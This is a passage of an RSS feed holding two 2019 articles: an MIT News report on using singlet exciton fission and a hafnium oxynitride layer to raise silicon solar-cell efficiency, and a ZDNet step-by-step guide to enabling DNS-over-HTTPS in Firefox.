&lt;div class=&quot;field-items&quot;&gt;
&lt;div class=&quot;field-item even&quot;&gt;
&lt;p&gt;In any conventional silicon-based solar cell, there is an absolute limit on overall efficiency, based partly on the fact that each photon of light can only knock loose a single electron, even if that photon carried twice the energy needed to do so. But now, researchers have demonstrated a method for getting high-energy photons striking silicon to kick out two electrons instead of one, opening the door for a new kind of solar cell with greater efficiency than was thought possible.&lt;/p&gt;
&lt;p&gt;While conventional silicon cells have an absolute theoretical maximum efficiency of about 29.1 percent conversion of solar energy, the new approach, developed over the last several years by researchers at MIT and elsewhere, could bust through that limit, potentially adding several percentage points to that maximum output. The results are described today in the journal &lt;em&gt;Nature&lt;/em&gt;, in a paper by graduate student Markus Einzinger, professor of chemistry Moungi Bawendi, professor of electrical engineering and computer science Marc Baldo, and eight others at MIT and at Princeton University.&lt;/p&gt;
&lt;p&gt;The basic concept behind this new technology has been known for decades, and the first demonstration that the principle could work was carried out by some members of this team &lt;a href=&quot;http://science.sciencemag.org/content/340/6130/334.full&quot; target=&quot;_blank&quot;&gt;six years ago&lt;/a&gt;. But actually translating the method into a full, operational silicon solar cell took years of hard work, Baldo says.&lt;/p&gt;
&lt;p&gt;That initial demonstration “was a good test platform” to show that the idea could work, explains Daniel Congreve PhD ’15, an alumnus now at the Rowland Institute at Harvard, who was the lead author in that prior report and is a co-author of the new paper. Now, with the new results, “we’ve done what we set out to do” in that project, he says.&lt;/p&gt;
&lt;p&gt;The original study demonstrated the production of two electrons from one photon, but it did so in an organic photovoltaic cell, which is less efficient than a silicon solar cell. It turned out that transferring the two electrons from a top collecting layer made of tetracene into the silicon cell “was not straightforward,” Baldo says. Troy Van Voorhis, a professor of chemistry at MIT who was part of that original team, points out that the concept was first proposed back in the 1970s, and says wryly that turning that idea into a practical device “only took 40 years.”&lt;/p&gt;
&lt;p&gt;The key to splitting the energy of one photon into two electrons lies in a class of materials that possess “excited states” called excitons, Baldo says: In these excitonic materials, “these packets of energy propagate around like the electrons in a circuit,” but with quite different properties than electrons. “You can use them to change energy — you can cut them in half, you can combine them.” In this case, they were going through a process called singlet exciton fission, which is how the light’s energy gets split into two separate, independently moving packets of energy. The material first absorbs a photon, forming an exciton that rapidly undergoes fission into two excited states, each with half the energy of the original state.&lt;/p&gt;
&lt;p&gt;But the tricky part was then coupling that energy over into the silicon, a material that is not excitonic. This coupling had never been accomplished before.&lt;/p&gt;
&lt;p&gt;As an intermediate step, the team tried coupling the energy from the excitonic layer into a material called quantum dots. “They’re still excitonic, but they’re inorganic,” Baldo says. “That worked; it worked like a charm,” he says. By understanding the mechanism taking place in that material, he says, “we had no reason to think that silicon wouldn’t work.”&lt;/p&gt;
&lt;p&gt;What that work showed, Van Voorhis says, is that the key to these energy transfers lies in the very surface of the material, not in its bulk. “So it was clear that the surface chemistry on silicon was going to be important. That was what was going to determine what kinds of surface states there were.” That focus on the surface chemistry may have been what allowed this team to succeed where others had not, he suggests.&lt;/p&gt;
&lt;p&gt;The key was in a thin intermediate layer. “It turns out this tiny, tiny strip of material at the interface between these two systems [the silicon solar cell and the tetracene layer with its excitonic properties] ended up defining everything. It’s why other researchers couldn’t get this process to work, and why we finally did.” It was Einzinger “who finally cracked that nut,” he says, by using a layer of a material called hafnium oxynitride.&lt;/p&gt;
&lt;p&gt;The layer is only a few atoms thick, or just 8 angstroms (ten-billionths of a meter), but it acted as a “nice bridge” for the excited states, Baldo says. That finally made it possible for the single high-energy photons to trigger the release of two electrons inside the silicon cell. That produces a doubling of the amount of energy produced by a given amount of sunlight in the blue and green part of the spectrum. Overall, that could produce an increase in the power produced by the solar cell — from a theoretical maximum of 29.1 percent, up to a maximum of about 35 percent.&lt;/p&gt;
&lt;p&gt;Actual silicon cells are not yet at their maximum, and neither is the new material, so more development needs to be done, but the crucial step of coupling the two materials efficiently has now been proven. “We still need to optimize the silicon cells for this process,” Baldo says. For one thing, with the new system those cells can be thinner than current versions. Work also needs to be done on stabilizing the materials for durability. Overall, commercial applications are probably still a few years off, the team says.&lt;/p&gt;
&lt;p&gt;Other approaches to improving the efficiency of solar cells tend to involve adding another kind of cell, such as a perovskite layer, over the silicon. Baldo says “they’re building one cell on top of another. Fundamentally, we’re making one cell — we’re kind of turbocharging the silicon cell. We’re adding more current into the silicon, as opposed to making two cells.”&lt;/p&gt;
&lt;p&gt;The researchers have measured one special property of hafnium oxynitride that helps it transfer the excitonic energy. “We know that hafnium oxynitride generates additional charge at the interface, which reduces losses by a process called electric field passivation. If we can establish better control over this phenomenon, efficiencies may climb even higher.” Einzinger says. So far, no other material they’ve tested can match its properties.&lt;/p&gt;
&lt;p&gt;The research was supported as part of the MIT Center for Excitonics, funded by the U.S. Department of Energy.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;hr id=&quot;separator-comments&quot;/&gt;&lt;section&gt;&lt;div id=&quot;article-tags&quot;&gt;
&lt;p&gt;&lt;strong class=&quot;label&quot;&gt;Topics:&lt;/strong&gt; &lt;span class=&quot;tags&quot;&gt;&lt;a href=&quot;http://news.mit.edu/topic/school-engineering&quot;&gt;School of Engineering&lt;/a&gt;&lt;span class=&quot;comma&quot;&gt;,&lt;/span&gt; &lt;a href=&quot;http://news.mit.edu/topic/alternative-energy&quot;&gt;Alternative energy&lt;/a&gt;&lt;span class=&quot;comma&quot;&gt;,&lt;/span&gt; &lt;a href=&quot;http://news.mit.edu/topic/chemistry-0&quot;&gt;Chemistry&lt;/a&gt;&lt;span class=&quot;comma&quot;&gt;,&lt;/span&gt; &lt;a href=&quot;http://news.mit.edu/topic/excitonics&quot;&gt;Excitonics&lt;/a&gt;&lt;span class=&quot;comma&quot;&gt;,&lt;/span&gt; &lt;a href=&quot;http://news.mit.edu/topic/climate-change&quot;&gt;Climate change&lt;/a&gt;&lt;span class=&quot;comma&quot;&gt;,&lt;/span&gt; &lt;a href=&quot;http://news.mit.edu/topic/energy&quot;&gt;Energy&lt;/a&gt;&lt;span class=&quot;comma&quot;&gt;,&lt;/span&gt; &lt;a href=&quot;http://news.mit.edu/topic/mit-energy-initiative&quot;&gt;MIT Energy Initiative&lt;/a&gt;&lt;span class=&quot;comma&quot;&gt;,&lt;/span&gt; &lt;a href=&quot;http://news.mit.edu/topic/research&quot;&gt;Research&lt;/a&gt;&lt;span class=&quot;comma&quot;&gt;,&lt;/span&gt; &lt;a href=&quot;http://news.mit.edu/topic/solar&quot;&gt;Solar&lt;/a&gt;&lt;span class=&quot;comma&quot;&gt;,&lt;/span&gt; &lt;a href=&quot;http://news.mit.edu/topic/doe&quot;&gt;Department of Energy (DoE)&lt;/a&gt;&lt;span class=&quot;comma&quot;&gt;,&lt;/span&gt; &lt;a href=&quot;http://news.mit.edu/topic/nsf&quot;&gt;National Science Foundation (NSF)&lt;/a&gt;&lt;span class=&quot;comma&quot;&gt;,&lt;/span&gt; &lt;a href=&quot;http://news.mit.edu/topic/research-laboratory-electronics-1&quot;&gt;Research Laboratory of Electronics&lt;/a&gt;&lt;span class=&quot;comma&quot;&gt;,&lt;/span&gt; &lt;a href=&quot;http://news.mit.edu/topic/electrical-engineering-computer-science-eecs&quot;&gt;Electrical Engineering &amp;amp; Computer Science (eecs)&lt;/a&gt;&lt;span class=&quot;comma&quot;&gt;,&lt;/span&gt; &lt;a href=&quot;http://news.mit.edu/topic/materialsscienceandengineering&quot;&gt;Materials Science and Engineering&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/section&gt;&lt;section&gt;
&lt;/section&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
</description>
<pubDate>Sat, 06 Jul 2019 20:29:47 +0000</pubDate>
<dc:creator>dirtyaura</dc:creator>
<og:image>http://news.mit.edu/sites/mit.edu.newsoffice/files/styles/og/public/images/2019/MIT-Super-Solar-Cells.jpg</og:image>
<og:title>Experiments show dramatic increase in solar cell output</og:title>
<og:description>Method for collecting two electrons from each photon could break through theoretical solar-cell efficiency limit.</og:description>
<og:type>article</og:type>
<og:url>http://news.mit.edu/2019/increase-solar-cell-output-photon-2-electron-0703</og:url>
<dc:format>text/html</dc:format>
<dc:identifier>http://news.mit.edu/2019/increase-solar-cell-output-photon-2-electron-0703</dc:identifier>
</item>
<item>
<title>How to Enable DNS-over-HTTPS in Firefox</title>
<link>https://www.zdnet.com/article/how-to-enable-dns-over-https-doh-in-firefox/</link>
<guid isPermaLink="true" >https://www.zdnet.com/article/how-to-enable-dns-over-https-doh-in-firefox/</guid>
<description>&lt;p&gt;The DNS-over-HTTPS (DoH) protocol is currently the talk of the town, and the Firefox browser is the only one to support it.&lt;/p&gt;
&lt;p&gt;However, the feature is not enabled by default for Firefox users, who will have to go through many hoops and modify multiple settings before they can get the DoH up and running.&lt;/p&gt;
&lt;p&gt;But before we go into a step-by-step tutorial on how someone can enable DoH support in Firefox, let's describe what it does first.&lt;/p&gt;
&lt;h3&gt;How DNS-over-HTTPS works&lt;/h3&gt;
&lt;p&gt;The DNS-over-HTTPS protocol works by taking a domain name that a user has typed in their browser and sending a query to a DNS server to learn the numerical IP address of the web server that hosts that specific site.&lt;/p&gt;
&lt;p&gt;This is how normal DNS works, too. However, DoH takes the DNS query and sends it to a DoH-compatible DNS server (resolver) via an encrypted HTTPS connection on port 443, rather than plaintext on port 53.&lt;/p&gt;

&lt;p&gt;This way, DoH hides DNS queries inside regular HTTPS traffic, so third-party observers won't be able to sniff traffic and tell what DNS queries users have run and infer what websites they are about to access.&lt;/p&gt;
&lt;p&gt;Further, a secondary feature of DNS-over-HTTPS is that the protocol works at the app level. Apps can come with internally hardcoded lists of DoH-compatible DNS resolvers where they can send DoH queries.&lt;/p&gt;
&lt;section class=&quot;sharethrough-top&quot; data-component=&quot;medusaContentRecommendation&quot; data-medusa-content-recommendation-options=&quot;{&amp;quot;promo&amp;quot;:&amp;quot;promo_ZD_recommendation_sharethrough_top_in_article_desktop&amp;quot;,&amp;quot;spot&amp;quot;:&amp;quot;dfp-in-article&amp;quot;}&quot;&gt;
&lt;/section&gt;&lt;p&gt;This mode of operation bypasses the default DNS settings that exist at the OS level, which, in most cases are the ones set by local internet service providers (ISPs).&lt;/p&gt;
&lt;p&gt;This also means that apps that support DoH can effectively bypass local ISPs traffic filters and access content that may be blocked by a local telco or local government -- and a reason why DoH is currently hailed as a boon for users' privacy and security.&lt;/p&gt;
&lt;p&gt;This is one of the reasons that DoH has gained quite the popularity in less than two years after it launched, and a reason why a group of &lt;a href=&quot;https://www.zdnet.com/article/uk-isp-group-names-mozilla-internet-villain-for-supporting-dns-over-https/&quot; target=&quot;_blank&quot;&gt;UK ISPs nominated Mozilla for the award of 2019 Internet Vilain&lt;/a&gt; for its plans to support the DoH protocol, which they said would thwart their efforts in filtering bad traffic.&lt;/p&gt;
&lt;p&gt;As a response, and due to the complex situation in the UK where the government blocks access to copyright-infringing content, and where ISPs voluntarily block access to child abuse website, &lt;a href=&quot;https://www.zdnet.com/article/mozilla-no-plans-to-enable-dns-over-https-by-default-in-the-uk/&quot; target=&quot;_blank&quot;&gt;Mozilla has decided not to enable this feature by default for British users&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The below step-by-step guide will show Firefox users in the UK and Firefox users all over the world how to enable the feature right now, and not wait until Mozilla enables it later down the road -- if it will ever do. There are two methods of enabling DoH support in Firefox.&lt;/p&gt;
&lt;h3&gt;Method 1 - via the Firefox settings&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Step 1:&lt;/strong&gt; Go to the Firefox menu, choose &lt;strong&gt;Tools&lt;/strong&gt;, and then &lt;strong&gt;Preferences&lt;/strong&gt;. Optionally type &lt;strong&gt;about:preferences&lt;/strong&gt; in the URL bar and press enter. This will open the Firefox prerences section.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 2:&lt;/strong&gt; In the &lt;strong&gt;General&lt;/strong&gt; section, scroll down to the &lt;strong&gt;Network Settings&lt;/strong&gt; panel, and press the &lt;strong&gt;Settings&lt;/strong&gt; button.&lt;/p&gt;
&lt;span class=&quot;img aspect-set&quot;&gt;&lt;img src=&quot;https://zdnet1.cbsistatic.com/hub/i/2019/07/07/df30c7b0-3a20-4de7-8640-3dea6d249a49/121bd379b6232e1e2a97c35ea8c7764e/doh-settings-1.png&quot; class=&quot;&quot; alt=&quot;DoH section in Firefox settings&quot;/&gt;&lt;/span&gt; &lt;span class=&quot;credit&quot;&gt;Image: ZDNet&lt;/span&gt;
&lt;p&gt;&lt;strong&gt;Step 3:&lt;/strong&gt; In the popup, scroll down and select &quot;&lt;strong&gt;Enable DNS over HTTPS&lt;/strong&gt;,&quot; then configure your desired DoH resolver. You can use the built in Cloudflare resolver (a company with which Mozilla has &lt;a href=&quot;https://developers.cloudflare.com/1.1.1.1/commitment-to-privacy/privacy-policy/firefox/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;reached an agreement&lt;/a&gt; to log less data about Firefox users), or use one of your choice, &lt;a href=&quot;https://developers.cloudflare.com/1.1.1.1/commitment-to-privacy/privacy-policy/firefox/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;from this list&lt;/a&gt;.&lt;/p&gt;
&lt;span class=&quot;img aspect-set&quot;&gt;&lt;img src=&quot;https://www.zdnet.com/article/how-to-enable-dns-over-https-doh-in-firefox/&quot; class=&quot;lazy&quot; alt=&quot;DoH section in Firefox settings&quot; data-original=&quot; https://zdnet3.cbsistatic.com/hub/i/2019/07/07/8608af28-2a28-4ff1-952b-9b6d2deb1ea6/b1fc322caaa2c955b1a2fb285daf0e42/doh-settings-2.png&quot;/&gt;&lt;/span&gt;&lt;noscript&gt;
&lt;p&gt;&lt;span class=&quot;img aspect-set&quot;&gt;&lt;img src=&quot;https://zdnet3.cbsistatic.com/hub/i/2019/07/07/8608af28-2a28-4ff1-952b-9b6d2deb1ea6/b1fc322caaa2c955b1a2fb285daf0e42/doh-settings-2.png&quot; class=&quot;&quot; alt=&quot;DoH section in Firefox settings&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/noscript&gt; &lt;span class=&quot;credit&quot;&gt;Image: ZDNet&lt;/span&gt;
&lt;h3&gt;Method 2 - via about:config&lt;br/&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Step 1:&lt;/strong&gt; Type &lt;strong&gt;about:config&lt;/strong&gt; in the URL bar and press Enter to access Firefox's hidden configuration panel. Here users will need to enable and modify three settings.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 2:&lt;/strong&gt; The first setting is &lt;strong&gt;network.trr.mode&lt;/strong&gt;. This turns on DoH support. This setting supports four values:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;0 - Default value in standard Firefox installations (currently is 5, which means DoH is disabled)&lt;/li&gt;
&lt;li&gt;1 - DoH is enabled, but Firefox picks if it uses DoH or regular DNS based on which returns faster query responses&lt;/li&gt;
&lt;li&gt;2 - DoH is enabled, and regular DNS works as a backup&lt;/li&gt;
&lt;li&gt;3 - DoH is enabled, and regular DNS is disabled&lt;/li&gt;
&lt;li&gt;5 - DoH is disabled&lt;br/&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;A value of 2 works best.&lt;/p&gt;
&lt;span class=&quot;img aspect-set&quot;&gt;&lt;img src=&quot;https://www.zdnet.com/article/how-to-enable-dns-over-https-doh-in-firefox/&quot; class=&quot;lazy&quot; alt=&quot;DoH in Firefox&quot; data-original=&quot; https://zdnet1.cbsistatic.com/hub/i/2019/07/06/0232b3a7-82c6-4a6f-90c1-faf0c090254c/6db9b36509021c460fcc7fe825bb74c5/doh-1.png&quot;/&gt;&lt;/span&gt;&lt;noscript&gt;
&lt;p&gt;&lt;span class=&quot;img aspect-set&quot;&gt;&lt;img src=&quot;https://zdnet1.cbsistatic.com/hub/i/2019/07/06/0232b3a7-82c6-4a6f-90c1-faf0c090254c/6db9b36509021c460fcc7fe825bb74c5/doh-1.png&quot; class=&quot;&quot; alt=&quot;DoH in Firefox&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/noscript&gt; &lt;span class=&quot;credit&quot;&gt;Image: ZDNet&lt;/span&gt;
&lt;p&gt;&lt;strong&gt;Step 3:&lt;/strong&gt; The second setting that needs to be modified is &lt;strong&gt;network.trr.uri&lt;/strong&gt;. This is the URL of the DoH-compatible DNS server where Firefox will send DoH DNS queries. By default, Firefox uses Cloudflare's DoH service located at &lt;em&gt;https://mozilla.cloudflare-dns.com/dns-query.&lt;/em&gt; However, users can use their own DoH server URL. They can select one from the many available servers, &lt;a href=&quot;https://github.com/curl/curl/wiki/DNS-over-HTTPS#publicly-available-servers&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;from this list, here&lt;/a&gt;. The reason why Mozilla uses Cloudflare in Firefox is because the companies &lt;a href=&quot;https://developers.cloudflare.com/1.1.1.1/commitment-to-privacy/privacy-policy/firefox/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;reached an agreement&lt;/a&gt; following which Cloudflare would collect very little data on DoH queries coming from Firefox users.&lt;/p&gt;
&lt;span class=&quot;img aspect-set&quot;&gt;&lt;img src=&quot;https://www.zdnet.com/article/how-to-enable-dns-over-https-doh-in-firefox/&quot; class=&quot;lazy&quot; alt=&quot;DoH in Firefox&quot; data-original=&quot; https://zdnet2.cbsistatic.com/hub/i/2019/07/06/4dd1d5c1-6fa7-4f5b-b7cd-b544748edfed/baa7a70ac084861d94a744a57a3147ad/doh-2.png&quot;/&gt;&lt;/span&gt;&lt;noscript&gt;
&lt;p&gt;&lt;span class=&quot;img aspect-set&quot;&gt;&lt;img src=&quot;https://zdnet2.cbsistatic.com/hub/i/2019/07/06/4dd1d5c1-6fa7-4f5b-b7cd-b544748edfed/baa7a70ac084861d94a744a57a3147ad/doh-2.png&quot; class=&quot;&quot; alt=&quot;DoH in Firefox&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/noscript&gt; &lt;span class=&quot;credit&quot;&gt;Image: ZDNet&lt;/span&gt;
&lt;p&gt;&lt;strong&gt;Step 4:&lt;/strong&gt; The third setting is optional and you can skip this one. But if things don't work, you can use this one as a backup for Step 3. The option is called &lt;strong&gt;network.trr.bootstrapAddress&lt;/strong&gt; and is an input field where users can enter the numerical IP address of the DoH-compatible DNS resolver they entered in Step 3. For Cloudflare, that would be 1.1.1.1. For Google's service, that would be 8.8.8.8. If you used another DoH resolver's URL, you'll need to track down that server's IP and enter it here, if ever necesarry.&lt;/p&gt;
&lt;span class=&quot;img aspect-set&quot;&gt;&lt;img src=&quot;https://www.zdnet.com/article/how-to-enable-dns-over-https-doh-in-firefox/&quot; class=&quot;lazy&quot; alt=&quot;DoH in Firefox&quot; data-original=&quot; https://zdnet1.cbsistatic.com/hub/i/2019/07/06/8ec20a28-673c-4a17-8195-16579398e90a/538fe8420f9b24724aeb4a6c8d4f0f0f/doh-3.png&quot;/&gt;&lt;/span&gt;&lt;noscript&gt;
&lt;p&gt;&lt;span class=&quot;img aspect-set&quot;&gt;&lt;img src=&quot;https://zdnet1.cbsistatic.com/hub/i/2019/07/06/8ec20a28-673c-4a17-8195-16579398e90a/538fe8420f9b24724aeb4a6c8d4f0f0f/doh-3.png&quot; class=&quot;&quot; alt=&quot;DoH in Firefox&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/noscript&gt; &lt;span class=&quot;credit&quot;&gt;Image: ZDNet&lt;/span&gt;
&lt;p&gt;Normally, the URL entered in Step 3 should be enough, though.&lt;/p&gt;
&lt;p&gt;Settings should apply right away, but in case they don't work, give Firefox a restart.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Article source:&lt;/em&gt; &lt;a href=&quot;https://wiki.mozilla.org/Trusted_Recursive_Resolver&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;&lt;em&gt;Mozilla Wiki&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;More browser coverage:&lt;/h3&gt;
</description>
<pubDate>Sat, 06 Jul 2019 20:28:36 +0000</pubDate>
<dc:creator>smacktoward</dc:creator>
<og:type>article</og:type>
<og:url>https://www.zdnet.com/article/how-to-enable-dns-over-https-doh-in-firefox/</og:url>
<og:title>How to enable DNS-over-HTTPS (DoH) in Firefox | ZDNet</og:title>
<og:description>A step by step guide to enable DNS-over-HTTPS (DoH) support in the Firefox browser.</og:description>
<og:image>https://zdnet3.cbsistatic.com/hub/i/r/2019/07/06/0232b3a7-82c6-4a6f-90c1-faf0c090254c/thumbnail/770x578/4fe29b094c9607af1ef5f4008f0208b2/doh-1.png</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.zdnet.com/article/how-to-enable-dns-over-https-doh-in-firefox/</dc:identifier>
</item>
</channel>
</rss>